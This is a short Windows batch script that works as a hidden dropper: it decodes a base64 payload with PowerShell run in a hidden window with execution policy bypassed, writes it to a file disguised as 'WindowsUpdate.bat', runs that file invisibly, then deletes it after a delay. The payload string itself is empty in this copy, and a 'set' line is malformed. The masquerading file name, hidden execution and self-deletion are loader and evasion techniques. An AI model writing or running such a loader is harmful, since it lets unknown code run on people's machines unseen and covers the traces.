@echo off
setlocal enabledelayedexpansion

set ""

:decode
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ^
"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 WindowsUpdate.bat"

set "trycount=0"
:waitloop
if exist "WindowsUpdate.bat" (
    goto runit
)
set /a trycount+=1
if %trycount% GEQ 20 (
    goto decode
)
ping -n 2 127.0.0.1 >nul
goto waitloop

:runit
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ^
"Start-Process -FilePath 'WindowsUpdate.bat' -WindowStyle Hidden -Wait"

ping -n 31 127.0.0.1 >nul
del /f /q WindowsUpdate.bat
exit
